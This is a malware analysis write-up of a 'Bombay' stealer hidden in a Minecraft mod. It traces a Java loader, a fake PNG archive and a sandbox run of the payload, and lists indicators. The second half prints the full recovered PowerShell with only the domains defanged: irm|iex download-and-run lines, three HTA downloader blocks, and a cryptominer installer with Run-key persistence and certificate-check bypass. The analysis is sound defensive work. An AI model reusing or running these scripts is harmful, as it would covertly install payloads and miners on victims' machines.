# Bombay Stealer Analysis
**Analysis date: 25 October 2026. static and dynamic analysis.**

I generated a test sample called `Client.jar` from the Bombay builder. After checking its loader and collecting the payload files, I did the dynamic analysis on the recovered `rename.exe`.

The analysis showed browser credential theft, hidden PowerShell commands, startup changes, and a cryptocurrency miner. But what i thought was the most interesting is that the sample, which is also a disguised Minecraft mod was compatible with multiple versions of the game which I have never seen before.

I included the [full PowerShell scripts below](#full-powershell-scripts), shown directly in the post as plain text.

## Inside Client.jar

The sample came from the Bombay builder. ANY.RUN itself uses general stealer and miner labels rather than naming the family.

The remote-loader call is directly in `Client.jar`. Fabric loads `TestMenuBootstrap`, which picks the matching `TestMenuMod` for the Minecraft version. That calls `StartupMessage.showOnce()`. This method starts hidden PowerShell through `ProcessBuilder` and runs this command:

```text
irm 'https://tools[.]lumma[.]cy/1ItyN?Fx=W' | iex
```
<img width="1103" height="741" alt="image" src="https://github.com/user-attachments/assets/0b2592b3-efe3-4c61-9e34-66c5dfb550bd" />

`irm` downloads the response, and `iex` executes it. That is how the Java code starts the remote stage.

## The fake PNG

I recovered an HTA, a Windows application built from HTML and scripts. It hid its window and created temporary VBScript files that started PowerShell with Base64-encoded commands.

Its three encoded blocks had the same logic with different variable names. Only the first two were launched.

They pointed to this address:

```text
hxxps://tools[.]lumma[.]cy/RAXNyF8gW_nzsb6tIZLm.png
```

I wondered if this was steganography. The downloaded file answered that pretty quickly: it started with a ZIP header and contained two files:

- `rename.exe`
- `.spread_meta`

The `.png` extension was just a disguise here. There wasnt any actual steganography. The script unpacked the ZIP into a temporary folder and tried to run `rename.exe` hidden.

The ANY.RUN test below starts directly from `rename.exe`.

## What was recorded during dynamic analysis

I submitted `rename.exe` to a Windows 10 64-bit sandbox. The 248-second run was marked malicious. Its MD5 matched the file inside the fake PNG archive.

[View the ANY.RUN report](https://app.any.run/tasks/4fe3c46a-0f54-443c-98f3-bb84e26afe8f/)

### Browser data and environment checks

ANY.RUN reported browser credential theft and checks for a virtual machine. It also flagged **possible** wallet and VPN data collection.

I would keep those last two findings as possible. I could not confirm exactly what data left the sandbox or where stolen data was sent.

### More PowerShell stages

`rename.exe` launched hidden PowerShell with encoded commands and a flag to bypass its script execution policy.

One command added a random six-digit number to an `irm[.]st/` address, then downloaded and ran the response. The report recorded a successful request to `irm[.]st/662108`.

A longer PowerShell command handled the miner setup. It referenced `irm[.]st/readme.zip` and used this folder:

```text
%APPDATA%\Microsoft\MicrosoftEdge
```

The name makes it look connected to Windows or Edge.

There is another filename trick in the installer: it expects a file called `readme.md` inside the ZIP and renames it to the miner executable. Some download retries also turn off certificate checks.

### The miner and startup entry

The process list showed `wscript.exe` running `start.vbs` and a program called `SystemSettingsBroker.exe` launched with this mining destination:

```text
stratum+tcp://c2[.]doxbin[.]cy:3333
```

The installer script created a `SystemSettingsBroker` entry in the current user's Windows Run key. It points to `start.vbs`, allowing the miner to start again at sign-in. ANY.RUN also recorded an autorun registry change.

The miner was launched, but I could not confirm successful mining. The `readme.zip` request also showed “No Response,” so that specific download is not confirmed successful.

## Useful indicators

| Indicator | What it relates to |
| --- | --- |
| `tools[.]lumma[.]cy` | Download host in Client.jar and the recovered HTA |
| `irm[.]st/662108` | Successful script request in this sandbox run |
| `irm[.]st/readme.zip` | Archive address in the miner installer |
| `c2[.]doxbin[.]cy:3333` | Mining destination in the launched process command |
| `%APPDATA%\Microsoft\MicrosoftEdge\start.vbs` | Startup launcher |
| `%APPDATA%\Microsoft\MicrosoftEdge\SystemSettingsBroker.exe` | Miner path used by the installer |

For the analyzed `rename.exe`:

```text
MD5:    f46136b450b33336902ac653988aebdd
SHA256: 9d45b7d824fbe8c6246e0f85bf45122f870497568d25f69cb22ce240960dba7f
```

## What I took from this

This investigation started with a Java loader and led to hidden scripts, a fake image download, and a Windows executable. The sandbox reported credential theft and showed a miner with a startup entry.

Detection for this Bombay Java loader is now in Jarscanner. Future builds and different native payloads still need their own checks.

## Full PowerShell scripts

Here are the scripts recovered from the files and the ANY.RUN process commands. I kept all their code and only changed the domains to use `[.]` for this post. These are malware samples for reading, not commands to run.

The three HTA blocks do the same thing with different variable names. I included all three so the recovered versions are here in full. The HTA only launches blocks 1 and 2.

### PowerShell command in Client.jar

From `StartupMessage.class`:

```text
irm 'https://tools[.]lumma[.]cy/1ItyN?Fx=W' | iex
```

---
If you want to try reversing or analyzing this malware yourself, I will upload everything needed in ./bombay_stuff
---

### HTA block 1 - archive downloader

```text
$vqMOj2577kWWsf = "https://tools[.]lumma[.]cy/RAXNyF8gW_nzsb6tIZLm.png"
$zRQiXJR53KUL = [System.IO.Path]::GetRandomFileName().Replace('.','')
$uOXirpGPwgn8X4eMVbj1 = [System.IO.Path]::GetTempPath()
$HZ_EIjqujoXZtXkTL = Join-Path $uOXirpGPwgn8X4eMVbj1 ("$zRQiXJR53KUL" + ".zip")
$lY1KsN6sbN8gbqQgNUN = Join-Path $uOXirpGPwgn8X4eMVbj1 $zRQiXJR53KUL
$qIzRS6444kTUOj5Ime2 = "rename.exe"
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
} catch { }

function _spreadStop {
    param([string]$Reason)
    Write-Host ('[Spread] ' + $Reason) -ForegroundColor Red
    try {
        if ($Host.Name -eq 'ConsoleHost' -and [Environment]::UserInteractive) {
            Read-Host 'Press Enter to exit'
        } else {
            Start-Sleep -Seconds 8
        }
    } catch {
        Start-Sleep -Seconds 8
    }
    exit 1
}

if (Test-Path -LiteralPath $lY1KsN6sbN8gbqQgNUN) {
    Remove-Item -LiteralPath $lY1KsN6sbN8gbqQgNUN -Recurse -Force -ErrorAction SilentlyContinue
}

$dlOk = $false
try {
    Start-BitsTransfer -Source $vqMOj2577kWWsf -Destination $HZ_EIjqujoXZtXkTL -ErrorAction Stop
    $dlOk = $true
} catch { }
if (-not $dlOk) {
    try {
        (New-Object Net.WebClient).DownloadFile($vqMOj2577kWWsf, $HZ_EIjqujoXZtXkTL)
        $dlOk = $true
    } catch { }
}
if (-not $dlOk) {
    try {
        Invoke-WebRequest -Uri $vqMOj2577kWWsf -OutFile $HZ_EIjqujoXZtXkTL -UseBasicParsing
        $dlOk = $true
    } catch {
        _spreadStop 'All download methods failed (BITS / WebClient / Invoke-WebRequest).'
    }
}

if (-not (Test-Path -LiteralPath $HZ_EIjqujoXZtXkTL)) {
    _spreadStop 'ZIP was not saved to temp — check URL, firewall, TLS.'
}
$bytes = [IO.File]::ReadAllBytes($HZ_EIjqujoXZtXkTL)
if ($bytes.Length -ge 3 -and $bytes[0] -eq 0xEF -and $bytes[1] -eq 0xBB -and $bytes[2] -eq 0xBF) {
    $trimmed = New-Object byte[] ($bytes.Length - 3)
    [Array]::Copy($bytes, 3, $trimmed, 0, $trimmed.Length)
    [IO.File]::WriteAllBytes($HZ_EIjqujoXZtXkTL, $trimmed)
    $bytes = $trimmed
}
if ($bytes.Length -lt 4 -or $bytes[0] -ne 0x50 -or $bytes[1] -ne 0x4B) {
    _spreadStop ('Not a ZIP (bad file or block). First bytes: {0} {1}' -f $bytes[0], $bytes[1])
}

$unzipped = $false
try {
    Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction Stop
    [System.IO.Compression.ZipFile]::ExtractToDirectory($HZ_EIjqujoXZtXkTL, $lY1KsN6sbN8gbqQgNUN)
    $unzipped = $true
} catch { }
if (-not $unzipped) {
    try {
        if (Test-Path -LiteralPath $lY1KsN6sbN8gbqQgNUN) {
            Remove-Item -LiteralPath $lY1KsN6sbN8gbqQgNUN -Recurse -Force -ErrorAction SilentlyContinue
        }
        Expand-Archive -LiteralPath $HZ_EIjqujoXZtXkTL -DestinationPath $lY1KsN6sbN8gbqQgNUN -Force
        $unzipped = $true
    } catch { }
}
if (-not $unzipped) {
    try {
        if (Test-Path -LiteralPath $lY1KsN6sbN8gbqQgNUN) {
            Remove-Item -LiteralPath $lY1KsN6sbN8gbqQgNUN -Recurse -Force -ErrorAction SilentlyContinue
        }
        New-Item -ItemType Directory -Path $lY1KsN6sbN8gbqQgNUN -Force | Out-Null
        $shell = New-Object -ComObject Shell.Application
        $zip_file = $shell.NameSpace((Resolve-Path $HZ_EIjqujoXZtXkTL).Path)
        $destination = $shell.NameSpace((Resolve-Path $lY1KsN6sbN8gbqQgNUN).Path)
        $destination.CopyHere($zip_file.Items(), 0x14)
        $maxAttempts = 120
        $attempt = 0
        while ($attempt -lt $maxAttempts -and -not (Test-Path -LiteralPath (Join-Path $lY1KsN6sbN8gbqQgNUN $qIzRS6444kTUOj5Ime2))) {
            Start-Sleep -Milliseconds 500
            $attempt++
        }
        if (Test-Path -LiteralPath (Join-Path $lY1KsN6sbN8gbqQgNUN $qIzRS6444kTUOj5Ime2)) { $unzipped = $true }
    } catch { }
}
if (-not $unzipped) {
    _spreadStop 'Could not unzip (ZipFile / Expand-Archive / Shell all failed).'
}

$exePath = Join-Path $lY1KsN6sbN8gbqQgNUN $qIzRS6444kTUOj5Ime2
if (-not (Test-Path -LiteralPath $exePath)) {
    _spreadStop ('EXE not found: ' + $exePath)
}

$svDPaQsPY8OVBTNR = (Get-Location).Path
Set-Location -LiteralPath $lY1KsN6sbN8gbqQgNUN
try {
    $Q0ko3ucyIdh_MOo = Start-Process -FilePath $exePath -WindowStyle Hidden -PassThru
} catch {
    _spreadStop ('Could not start rename.exe: ' + $_.Exception.Message)
} finally {
    if ($svDPaQsPY8OVBTNR) { Set-Location -LiteralPath $svDPaQsPY8OVBTNR }
}
```


### HTA block 2 - second copy of the downloader

```text
$QOwHwPyJDBIHc = "https://tools[.]lumma[.]cy/RAXNyF8gW_nzsb6tIZLm.png"
$MtRJVFx1oRVZyNVo = [System.IO.Path]::GetRandomFileName().Replace('.','')
$S3x08vn9scBjw = [System.IO.Path]::GetTempPath()
$vBsrEObYouALSJbF = Join-Path $S3x08vn9scBjw ("$MtRJVFx1oRVZyNVo" + ".zip")
$THe8nEDpyw = Join-Path $S3x08vn9scBjw $MtRJVFx1oRVZyNVo
$D3PjvsnFhBwL4w0 = "rename.exe"
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
} catch { }

function _spreadStop {
    param([string]$Reason)
    Write-Host ('[Spread] ' + $Reason) -ForegroundColor Red
    try {
        if ($Host.Name -eq 'ConsoleHost' -and [Environment]::UserInteractive) {
            Read-Host 'Press Enter to exit'
        } else {
            Start-Sleep -Seconds 8
        }
    } catch {
        Start-Sleep -Seconds 8
    }
    exit 1
}

if (Test-Path -LiteralPath $THe8nEDpyw) {
    Remove-Item -LiteralPath $THe8nEDpyw -Recurse -Force -ErrorAction SilentlyContinue
}

$dlOk = $false
try {
    Start-BitsTransfer -Source $QOwHwPyJDBIHc -Destination $vBsrEObYouALSJbF -ErrorAction Stop
    $dlOk = $true
} catch { }
if (-not $dlOk) {
    try {
        (New-Object Net.WebClient).DownloadFile($QOwHwPyJDBIHc, $vBsrEObYouALSJbF)
        $dlOk = $true
    } catch { }
}
if (-not $dlOk) {
    try {
        Invoke-WebRequest -Uri $QOwHwPyJDBIHc -OutFile $vBsrEObYouALSJbF -UseBasicParsing
        $dlOk = $true
    } catch {
        _spreadStop 'All download methods failed (BITS / WebClient / Invoke-WebRequest).'
    }
}

if (-not (Test-Path -LiteralPath $vBsrEObYouALSJbF)) {
    _spreadStop 'ZIP was not saved to temp — check URL, firewall, TLS.'
}
$bytes = [IO.File]::ReadAllBytes($vBsrEObYouALSJbF)
if ($bytes.Length -ge 3 -and $bytes[0] -eq 0xEF -and $bytes[1] -eq 0xBB -and $bytes[2] -eq 0xBF) {
    $trimmed = New-Object byte[] ($bytes.Length - 3)
    [Array]::Copy($bytes, 3, $trimmed, 0, $trimmed.Length)
    [IO.File]::WriteAllBytes($vBsrEObYouALSJbF, $trimmed)
    $bytes = $trimmed
}
if ($bytes.Length -lt 4 -or $bytes[0] -ne 0x50 -or $bytes[1] -ne 0x4B) {
    _spreadStop ('Not a ZIP (bad file or block). First bytes: {0} {1}' -f $bytes[0], $bytes[1])
}

$unzipped = $false
try {
    Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction Stop
    [System.IO.Compression.ZipFile]::ExtractToDirectory($vBsrEObYouALSJbF, $THe8nEDpyw)
    $unzipped = $true
} catch { }
if (-not $unzipped) {
    try {
        if (Test-Path -LiteralPath $THe8nEDpyw) {
            Remove-Item -LiteralPath $THe8nEDpyw -Recurse -Force -ErrorAction SilentlyContinue
        }
        Expand-Archive -LiteralPath $vBsrEObYouALSJbF -DestinationPath $THe8nEDpyw -Force
        $unzipped = $true
    } catch { }
}
if (-not $unzipped) {
    try {
        if (Test-Path -LiteralPath $THe8nEDpyw) {
            Remove-Item -LiteralPath $THe8nEDpyw -Recurse -Force -ErrorAction SilentlyContinue
        }
        New-Item -ItemType Directory -Path $THe8nEDpyw -Force | Out-Null
        $shell = New-Object -ComObject Shell.Application
        $zip_file = $shell.NameSpace((Resolve-Path $vBsrEObYouALSJbF).Path)
        $destination = $shell.NameSpace((Resolve-Path $THe8nEDpyw).Path)
        $destination.CopyHere($zip_file.Items(), 0x14)
        $maxAttempts = 120
        $attempt = 0
        while ($attempt -lt $maxAttempts -and -not (Test-Path -LiteralPath (Join-Path $THe8nEDpyw $D3PjvsnFhBwL4w0))) {
            Start-Sleep -Milliseconds 500
            $attempt++
        }
        if (Test-Path -LiteralPath (Join-Path $THe8nEDpyw $D3PjvsnFhBwL4w0)) { $unzipped = $true }
    } catch { }
}
if (-not $unzipped) {
    _spreadStop 'Could not unzip (ZipFile / Expand-Archive / Shell all failed).'
}

$exePath = Join-Path $THe8nEDpyw $D3PjvsnFhBwL4w0
if (-not (Test-Path -LiteralPath $exePath)) {
    _spreadStop ('EXE not found: ' + $exePath)
}

$ai8jRtuPrg9 = (Get-Location).Path
Set-Location -LiteralPath $THe8nEDpyw
try {
    $MjrcCFex = Start-Process -FilePath $exePath -WindowStyle Hidden -PassThru
} catch {
    _spreadStop ('Could not start rename.exe: ' + $_.Exception.Message)
} finally {
    if ($ai8jRtuPrg9) { Set-Location -LiteralPath $ai8jRtuPrg9 }
}
```


### HTA block 3 - included in the file, but not launched by its loop

```text
$iCoKHADqBpzLQ7jqKPRs = "https://tools[.]lumma[.]cy/RAXNyF8gW_nzsb6tIZLm.png"
$RbtL2553kir_x50 = [System.IO.Path]::GetRandomFileName().Replace('.','')
$eSKALz7Klvm = [System.IO.Path]::GetTempPath()
$DAFGdvxi4JRV = Join-Path $eSKALz7Klvm ("$RbtL2553kir_x50" + ".zip")
$VBsffB78lQm = Join-Path $eSKALz7Klvm $RbtL2553kir_x50
$tT2jDpoptthB = "rename.exe"
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
} catch { }

function _spreadStop {
    param([string]$Reason)
    Write-Host ('[Spread] ' + $Reason) -ForegroundColor Red
    try {
        if ($Host.Name -eq 'ConsoleHost' -and [Environment]::UserInteractive) {
            Read-Host 'Press Enter to exit'
        } else {
            Start-Sleep -Seconds 8
        }
    } catch {
        Start-Sleep -Seconds 8
    }
    exit 1
}

if (Test-Path -LiteralPath $VBsffB78lQm) {
    Remove-Item -LiteralPath $VBsffB78lQm -Recurse -Force -ErrorAction SilentlyContinue
}

$dlOk = $false
try {
    Start-BitsTransfer -Source $iCoKHADqBpzLQ7jqKPRs -Destination $DAFGdvxi4JRV -ErrorAction Stop
    $dlOk = $true
} catch { }
if (-not $dlOk) {
    try {
        (New-Object Net.WebClient).DownloadFile($iCoKHADqBpzLQ7jqKPRs, $DAFGdvxi4JRV)
        $dlOk = $true
    } catch { }
}
if (-not $dlOk) {
    try {
        Invoke-WebRequest -Uri $iCoKHADqBpzLQ7jqKPRs -OutFile $DAFGdvxi4JRV -UseBasicParsing
        $dlOk = $true
    } catch {
        _spreadStop 'All download methods failed (BITS / WebClient / Invoke-WebRequest).'
    }
}

if (-not (Test-Path -LiteralPath $DAFGdvxi4JRV)) {
    _spreadStop 'ZIP was not saved to temp — check URL, firewall, TLS.'
}
$bytes = [IO.File]::ReadAllBytes($DAFGdvxi4JRV)
if ($bytes.Length -ge 3 -and $bytes[0] -eq 0xEF -and $bytes[1] -eq 0xBB -and $bytes[2] -eq 0xBF) {
    $trimmed = New-Object byte[] ($bytes.Length - 3)
    [Array]::Copy($bytes, 3, $trimmed, 0, $trimmed.Length)
    [IO.File]::WriteAllBytes($DAFGdvxi4JRV, $trimmed)
    $bytes = $trimmed
}
if ($bytes.Length -lt 4 -or $bytes[0] -ne 0x50 -or $bytes[1] -ne 0x4B) {
    _spreadStop ('Not a ZIP (bad file or block). First bytes: {0} {1}' -f $bytes[0], $bytes[1])
}

$unzipped = $false
try {
    Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction Stop
    [System.IO.Compression.ZipFile]::ExtractToDirectory($DAFGdvxi4JRV, $VBsffB78lQm)
    $unzipped = $true
} catch { }
if (-not $unzipped) {
    try {
        if (Test-Path -LiteralPath $VBsffB78lQm) {
            Remove-Item -LiteralPath $VBsffB78lQm -Recurse -Force -ErrorAction SilentlyContinue
        }
        Expand-Archive -LiteralPath $DAFGdvxi4JRV -DestinationPath $VBsffB78lQm -Force
        $unzipped = $true
    } catch { }
}
if (-not $unzipped) {
    try {
        if (Test-Path -LiteralPath $VBsffB78lQm) {
            Remove-Item -LiteralPath $VBsffB78lQm -Recurse -Force -ErrorAction SilentlyContinue
        }
        New-Item -ItemType Directory -Path $VBsffB78lQm -Force | Out-Null
        $shell = New-Object -ComObject Shell.Application
        $zip_file = $shell.NameSpace((Resolve-Path $DAFGdvxi4JRV).Path)
        $destination = $shell.NameSpace((Resolve-Path $VBsffB78lQm).Path)
        $destination.CopyHere($zip_file.Items(), 0x14)
        $maxAttempts = 120
        $attempt = 0
        while ($attempt -lt $maxAttempts -and -not (Test-Path -LiteralPath (Join-Path $VBsffB78lQm $tT2jDpoptthB))) {
            Start-Sleep -Milliseconds 500
            $attempt++
        }
        if (Test-Path -LiteralPath (Join-Path $VBsffB78lQm $tT2jDpoptthB)) { $unzipped = $true }
    } catch { }
}
if (-not $unzipped) {
    _spreadStop 'Could not unzip (ZipFile / Expand-Archive / Shell all failed).'
}

$exePath = Join-Path $VBsffB78lQm $tT2jDpoptthB
if (-not (Test-Path -LiteralPath $exePath)) {
    _spreadStop ('EXE not found: ' + $exePath)
}

$vhdf5Y4zTp5VNtfwGzMY = (Get-Location).Path
Set-Location -LiteralPath $VBsffB78lQm
try {
    $xdM2CsWAJSmVq4ParKK = Start-Process -FilePath $exePath -WindowStyle Hidden -PassThru
} catch {
    _spreadStop ('Could not start rename.exe: ' + $_.Exception.Message)
} finally {
    if ($vhdf5Y4zTp5VNtfwGzMY) { Set-Location -LiteralPath $vhdf5Y4zTp5VNtfwGzMY }
}
```


### Decoded six digit download launcher

```text
$id='';for($i=0;$i -lt 6;$i++){$id+=(Get-Random -Minimum 0 -Maximum 10)};iex (irm ('irm[.]st/'+$id))
```


### Full decoded miner installer

```text
Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

$Url        = 'https://irm[.]st/readme.zip'
$AppName    = 'SystemSettingsBroker'
$StratumUrl = 'stratum+tcp://c2[.]doxbin[.]cy:3333'
$UserArg    = 'x.xmrrig'

$TargetDir  = Join-Path $env:APPDATA 'Microsoft\MicrosoftEdge'
$ZipPath    = Join-Path $TargetDir 'k.zip'
$ExePath    = Join-Path $TargetDir ($AppName + '.exe')
$VbsPath    = Join-Path $TargetDir 'start.vbs'
$ReadmePath = Join-Path $TargetDir 'readme.md'

$RunKey      = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$ApprovedRun = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run'

$EnabledBlob = [byte[]](0x02,0,0,0,0,0,0,0,0,0,0,0)

function Enable-BestTls {
    $flags = 0
    foreach ($n in @('Tls13','Tls12','Tls11','Tls','Ssl3')) {
        try {
            $val = [System.Net.SecurityProtocolType]::$n
            if ($val) { $flags = $flags -bor [int]$val }
        } catch { }
    }
    if ($flags -eq 0) { return }
    try {
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]$flags
    } catch { }
}

function Enable-RelaxedCert {
    try {
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {
            param($s,$c,$ch,$e) return $true
        }
    } catch { }
}

function Disable-RelaxedCert {
    try {
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null
    } catch { }
}

Enable-BestTls

function Test-CommandExists {
    param([Parameter(Mandatory)][string]$Name)
    return [bool](Get-Command -Name $Name -ErrorAction SilentlyContinue)
}

function Get-PropValue {
    param($Object,[Parameter(Mandatory)][string]$Name)
    if (-not $Object) { return $null }
    $p = $Object.PSObject.Properties[$Name]
    if (-not $p) { return $null }
    return $p.Value
}

function Assert-StartupEnabled {
    param([Parameter(Mandatory)][string]$RunName)

    if (-not (Test-Path $RunKey)) { return $false }

    $runItem = Get-ItemProperty -Path $RunKey -ErrorAction SilentlyContinue
    $runValue = Get-PropValue -Object $runItem -Name $RunName
    if (-not $runValue) { return $false }

    if (-not (Test-Path $ApprovedRun)) { New-Item -Path $ApprovedRun -Force | Out-Null }

    $approvedItem = Get-ItemProperty -Path $ApprovedRun -ErrorAction SilentlyContinue
    $before = Get-PropValue -Object $approvedItem -Name $RunName

    if ($before -and $before.Length -ge 1 -and $before[0] -eq 2) { return $true }

    New-ItemProperty -Path $ApprovedRun -Name $RunName -PropertyType Binary -Value $EnabledBlob -Force | Out-Null

    $afterItem = Get-ItemProperty -Path $ApprovedRun -ErrorAction SilentlyContinue
    $after = Get-PropValue -Object $afterItem -Name $RunName

    if (-not $after) { return $false }
    return (($after -join ',') -eq ($EnabledBlob -join ','))
}

function Test-AppRunning {
    param([Parameter(Mandatory)][string]$ProcName, [Parameter(Mandatory)][string]$TargetPath)
    
    $exe = $ProcName + '.exe'

    try {
        $cim = Get-CimInstance Win32_Process -Filter "Name='$exe'" -ErrorAction SilentlyContinue
        if ($cim) {
            foreach ($p in $cim) {
                if ($p.ExecutablePath -and ($p.ExecutablePath -ieq $TargetPath)) {
                    return $true
                }
            }
        }
    } catch { }
    
    try {
        $procs = Get-Process -Name $ProcName -ErrorAction SilentlyContinue
        if ($procs) {
            foreach ($p in $procs) {
                try {
                    if ($p.Path -and ($p.Path -ieq $TargetPath)) {
                        return $true
                    }
                } catch { }
            }
        }
    } catch { }
    
    return $false
}

function Get-FileWithFallback {
    param([string]$Url,[string]$OutFile)
    $hdr = @{ 'User-Agent' = 'Mozilla/5.0' }
    if (Test-CommandExists 'Invoke-WebRequest') {
        try { Invoke-WebRequest -Uri $Url -OutFile $OutFile -UseBasicParsing -Headers $hdr -ErrorAction Stop; return } catch { }
        try { Enable-RelaxedCert; Invoke-WebRequest -Uri $Url -OutFile $OutFile -UseBasicParsing -Headers $hdr -ErrorAction Stop; return }
        catch { } finally { Disable-RelaxedCert }
    }
    if (Test-CommandExists 'Start-BitsTransfer') {
        try { Start-BitsTransfer -Source $Url -Destination $OutFile -ErrorAction Stop; return } catch { }
    }
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('User-Agent','Mozilla/5.0')
        try { $wc.DownloadFile($Url,$OutFile) } finally { $wc.Dispose() }
        return
    } catch { }
    try {
        Enable-RelaxedCert
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('User-Agent','Mozilla/5.0')
        try { $wc.DownloadFile($Url,$OutFile) } finally { $wc.Dispose() }
        return
    } catch { } finally { Disable-RelaxedCert }
    throw "Download failed: $Url"
}

function Expand-ZipWithFallback {
    param([string]$Path,[string]$DestinationPath)
    if (Test-CommandExists 'Expand-Archive') {
        try {
            Expand-Archive -LiteralPath $Path -DestinationPath $DestinationPath -Force -ErrorAction Stop
            return
        } catch { }
    }
    if (-not (Test-Path -LiteralPath $DestinationPath)) {
        New-Item -ItemType Directory -Path $DestinationPath -Force | Out-Null
    }
    $src  = (Resolve-Path -LiteralPath $Path).Path
    $dest = (Resolve-Path -LiteralPath $DestinationPath).Path
    $shell  = New-Object -ComObject Shell.Application
    $zip    = $shell.NameSpace($src)
    $target = $shell.NameSpace($dest)
    if ($null -eq $zip)    { throw "ZIP open failed: $src" }
    if ($null -eq $target) { throw "Dest unavailable: $dest" }
    $target.CopyHere($zip.Items(), 0x14)
    $deadline = (Get-Date).AddSeconds(15)
    while ((Get-Date) -lt $deadline) {
        if ((Get-ChildItem -LiteralPath $dest -Force | Measure-Object).Count -gt 0) { break }
        Start-Sleep -Milliseconds 200
    }
}

Assert-StartupEnabled -RunName $AppName | Out-Null

$running   = Test-AppRunning -ProcName $AppName -TargetPath $ExePath
$exeExists = Test-Path -LiteralPath $ExePath

if (-not $exeExists -and -not $running) {
    if (Test-Path -LiteralPath $TargetDir) {
        Remove-Item -LiteralPath $ReadmePath -Force -ErrorAction SilentlyContinue
        Remove-Item -LiteralPath $ZipPath    -Force -ErrorAction SilentlyContinue
        Remove-Item -LiteralPath (Join-Path $TargetDir 'guard.vbs') -Force -ErrorAction SilentlyContinue
    } else {
        New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null
    }

    Get-FileWithFallback -Url $Url -OutFile $ZipPath
    Expand-ZipWithFallback -Path $ZipPath -DestinationPath $TargetDir

    if (Test-Path -LiteralPath $ReadmePath) {
        Move-Item -LiteralPath $ReadmePath -Destination $ExePath -Force
    } else {
        throw "readme.md missing in zip"
    }

    foreach ($f in @($ZipPath,
                     (Join-Path $TargetDir 'Start.bat'),
                     (Join-Path $TargetDir 'Start-Quantus.bat'))) {
        Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue
    }
}

$startVbs = @"
Dim sh, app, runKey, runVal, targetPath, targetDir, minerCmd
Dim wmi, procs, found, p
app = "$AppName"
runKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
Set sh = CreateObject("WScript.Shell")
targetDir = sh.ExpandEnvironmentStrings("%APPDATA%\Microsoft\MicrosoftEdge")
targetPath = targetDir & "\" & app & ".exe"
minerCmd = """" & targetPath & """" & " --url $StratumUrl --user $UserArg"
On Error Resume Next
runVal = sh.RegRead(runKey & "\" & app)
On Error GoTo 0
If Len(runVal) = 0 Then WScript.Quit 0
Set wmi = GetObject("winmgmts:\\.\root\cimv2")
Set procs = wmi.ExecQuery("SELECT Name, ExecutablePath FROM Win32_Process WHERE Name='" & app & ".exe'")
found = False
For Each p In procs
    If Not IsNull(p.ExecutablePath) Then
        If LCase(p.ExecutablePath) = LCase(targetPath) Then
            found = True
        End If
    End If
Next
If Not found Then
    sh.CurrentDirectory = targetDir
    sh.Run minerCmd, 0, False
End If
"@
[System.IO.File]::WriteAllText($VbsPath, $startVbs, [System.Text.Encoding]::Unicode)

$runValue = 'wscript.exe "' + $VbsPath + '"'
if (-not (Test-Path $RunKey)) { New-Item -Path $RunKey -Force | Out-Null }
New-ItemProperty -Path $RunKey -Name $AppName -Value $runValue -PropertyType String -Force | Out-Null

Assert-StartupEnabled -RunName $AppName | Out-Null

if (Test-Path -LiteralPath $VbsPath) {
    if (Test-CommandExists 'wscript.exe') { wscript.exe $VbsPath } else { Start-Process -FilePath $VbsPath }
}
```

